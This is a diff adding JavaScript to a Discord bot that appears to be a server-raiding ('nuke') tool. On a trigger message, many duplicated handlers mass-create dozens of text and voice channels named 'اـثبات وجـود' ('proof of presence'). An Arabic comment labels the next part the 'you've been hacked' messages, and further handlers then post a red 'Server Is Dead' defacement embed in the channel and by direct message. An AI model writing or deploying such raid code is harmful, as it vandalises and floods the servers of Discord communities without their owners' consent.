+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+  message.guild.createChannel('اـثبات وجـود', 'text');
+  message.guild.createChannel('اـثبات وجـود', 'voice');
+
+
+ }
+
+});
+
+//هنا الرسايل تم تهكيرك وكذا
+
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
